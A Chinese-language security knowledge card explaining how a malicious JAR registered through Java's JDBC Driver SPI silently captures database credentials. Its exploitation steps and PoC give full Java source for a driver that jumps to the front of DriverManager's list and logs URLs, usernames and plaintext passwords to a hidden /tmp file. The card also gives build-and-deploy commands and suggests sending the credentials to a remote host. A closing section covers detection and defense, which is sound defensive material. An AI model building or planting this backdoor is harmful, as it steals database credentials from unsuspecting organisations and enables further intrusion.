---
id: web-java-classloader-jdbc-driver-spi-credential-theft
title: JDBC Driver SPI 劫持：投放恶意 JAR 透明截获数据库凭证
type: scenario
domain: web
path: web/java/classloader
technique: jdbc-driver-spi-hijack
aliases:
- JDBC SPI 劫持
- Driver SPI 后门
- 数据库凭证窃取
- ServiceLoader Driver 劫持
- SPI 供应链后门
- 恶意 JDBC Driver
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- spi
- jdbc
- driver
- serviceloader
- credential-theft
- classloader
- jar
cve: []
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:42:01+08:00'
  notes: 已对照原文与截图核对 SPI 描述文件、静态块反注册重注册占首位、connect 返回 null 透明旁路与凭证日志内容；未验证点：未在本机复现，依赖原文运行截图；前提为可向 classpath 投放 JAR
---

## 一句话结论

把一个在 `META-INF/services/java.sql.Driver` 中注册了恶意 `Driver` 实现的 JAR 放进目标类路径，`DriverManager` 初始化时会通过 SPI 自动加载它；恶意驱动在静态初始化块中把自己排到驱动列表首位，并在 `connect()` 中记录 URL、用户名、密码后返回 `null`，真正的驱动继续完成连接，应用行为完全不变，数据库凭证被透明窃取。

## 原理

- `java.sql.DriverManager` 在类初始化时调用 `ServiceLoader.load(Driver.class)`，扫描类路径上所有 JAR 的 `META-INF/services/java.sql.Driver`，实例化其中声明的实现类。`ServiceLoader` 不区分 JAR 来源是否可信。
- 驱动列表按注册顺序遍历，`getConnection(url,user,password)` 会依次调用每个 `Driver.connect()`，直到某个驱动返回非 `null` 的 `Connection`。排在前面的驱动可以先看到完整连接参数。
- 恶意驱动的静态初始化块先枚举并反注册所有已存在驱动，再注册自身，最后把原有驱动重新注册回去，从而占据列表首位；`connect()` 把 JDBC URL、用户名、明文密码写入隐藏文件后返回 `null`，`DriverManager` 继续尝试下一个驱动，H2 等真实驱动正常建立连接。
- `acceptsURL()` 恒返回 `true`，确保任何 URL 都会进入恶意 `connect()`；异常静默处理，避免影响业务。
- 攻击者唯一需要的能力是向类路径投放一个 JAR：依赖混淆、上游组件投毒、将 JAR 上传到应用可达的类路径目录、CI/CD 构建期注入依赖、共享类库目录写入等均可实现。

## 触发条件

1. 恶意 JAR 进入目标应用的 classpath（直接/传递依赖，或 `WEB-INF/lib`、共享库目录、`-cp` 包含的目录）。
2. 应用使用 `DriverManager` 建立数据库连接（JDBC 驱动由 SPI 自动发现）。
3. 类加载器能加载该 JAR 中的类；`DriverManager` 初始化发生在连接前。
4. Web 进程对目标路径有写权限（用于落凭证日志）。

## 利用步骤

1. 实现 `java.sql.Driver`：静态初始化块反注册全部现有驱动 → 注册自身 → 重新注册原有驱动；`connect()` 记录连接参数并返回 `null`。
2. 创建 `META-INF/services/java.sql.Driver`，内容为恶意驱动全限定类名。
3. 编译打包为 JAR，投放到目标类路径。
4. 应用下次启动或首次使用 `DriverManager` 时自动加载，正常业务连接照常成功。
5. 读取隐藏凭证日志，获得数据库 URL、账号与明文密码；可进一步直连数据库。

## PoC

恶意驱动核心：

```java
public class MaliciousJdbcDriver implements Driver {
    private static final MaliciousJdbcDriver INSTANCE = new MaliciousJdbcDriver();

    static {
        try {
            List<Driver> existing = new ArrayList<>();
            Enumeration<Driver> en = DriverManager.getDrivers();
            while (en.hasMoreElements()) existing.add(en.nextElement());
            for (Driver d : existing) DriverManager.deregisterDriver(d);
            DriverManager.registerDriver(INSTANCE);   // 自身排到首位
            for (Driver d : existing) DriverManager.registerDriver(d);
        } catch (SQLException e) { throw new RuntimeException(e); }
    }

    @Override
    public Connection connect(String url, Properties info) {
        String user = info != null ? info.getProperty("user", "") : "";
        String pass = info != null ? info.getProperty("password", "") : "";
        try {
            Files.writeString(Path.of("/tmp/.jdbc_creds.log"),
                "URL: " + url + "\nUser: " + user + "\nPass: " + pass + "\n",
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException ignored) {}
        return null;   // 让真实驱动继续处理连接
    }

    @Override public boolean acceptsURL(String url) { return true; }
    // getPropertyInfo/getMajorVersion/... 返回占位值
}
```

SPI 文件 `META-INF/services/java.sql.Driver`：

```text
evil.MaliciousJdbcDriver
```

打包与投放：

```bash
javac -d . MaliciousJdbcDriver.java
jar cf malicious-jdbc-driver.jar evil/ META-INF/
java -cp .:h2.jar:malicious-jdbc-driver.jar TargetApp
```

原文实测应用输出与未投放时完全一致，`/tmp/.jdbc_creds.log` 中出现 `jdbc:h2:mem:targetdb`、`admin` 与明文密码；`DriverManager.getDrivers()` 顺序为 `[0] evil.MaliciousJdbcDriver`、`[1] org.h2.Driver`。

## 变体与关联

- 同属 SPI 自动加载面：`ServletContainerInitializer` 可注入 Web 后门（见独立卡片）；`FileSystemProvider`、`URLStreamHandlerProvider`、`ScriptEngineFactory`、`java.security.Provider` 理论上可拦截文件/网络/脚本/加密（原文仅给思路，未完整实现）。
- 与 Java Agent、内存马相比，SPI 后门只需放置 JAR、无需修改应用代码或启动参数，且重启后仍存活（JAR 还在类路径上）。
- 可把凭证外发到远程而非写本地文件，降低被发现概率；也可进一步篡改 SQL 或劫持事务。

## 检测与防御

- 类路径审计：扫描所有 JAR 的 `META-INF/services/*`，与已知合法 SPI 清单比对；发现非标准包名的 `java.sql.Driver` 实现即告警。
- 运行时审计：启动后枚举 `DriverManager.getDrivers()`，打印每个驱动的类名与 `CodeSource` 路径，出现来源不明的驱动即存在劫持风险。
- 文件完整性监控：用 AIDE/OSSEC 监控 `WEB-INF/lib`、应用 classpath 目录、`~/.m2/repository` 的变更。
- 类路径最小化与依赖锁定：不把用户可控目录加入 classpath；使用依赖锁、校验和与 JAR 签名验证；私有仓库启用上传审计与访问控制。
- 凭证保护：数据库使用最小权限账号、轮换口令、启用 TLS 与来源限制；即使被截获也降低横向影响。
